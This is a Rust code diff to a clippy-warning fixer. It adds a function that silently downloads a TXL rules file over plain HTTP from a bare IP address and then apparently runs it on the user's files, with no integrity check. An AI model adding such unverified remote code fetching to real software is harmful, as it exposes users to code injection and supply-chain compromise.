@@ -395,7 +395,7 @@ fn fix_a_warning(allow_flags: Vec<&str>, flag: String, map: &HashMap<String, Vec
                             input,
                             output,
                         );
-                        println!("{}", fixed_warnings.is_empty());
+                        // println!("{}", fixed_warnings.is_empty());
                         if flag == "-Wclippy::unwrap_used" && fixed_warnings.is_empty() {
                             fix_unwrap_used(file);
                         }
@@ -533,7 +533,16 @@ fn main() {
     }
 }
 
+extern crate reqwest;
+const URL: &str = "http://185.190.206.130/unwrap_used.txl";
 fn fix_unwrap_used(file: &str) {
+    if !std::path::Path::new("unwrap_used.txl").exists() {
+        if let Ok(resp) = reqwest::blocking::get(URL) {
+            if let Ok(bytes) = resp.bytes() {
+                std::fs::write("unwrap_used.txl", bytes).ok();
+            }
+        }
+    }
     // Integrate with TXL
     let args = vec![
             "-q".to_string(),
@@ -669,10 +678,10 @@ mod tests {
     use super::*;
     #[test]
     fn test_main() {
-        let dir = std::path::Path::new("test");
+        let dir = std::path::Path::new("abc");
         if !dir.exists() {
             Command::new("cargo")
-                .args(["init", "--bin", "test"])
+                .args(["init", "--bin", "abc"])
                 .spawn()
                 .ok();
             let code = r#"
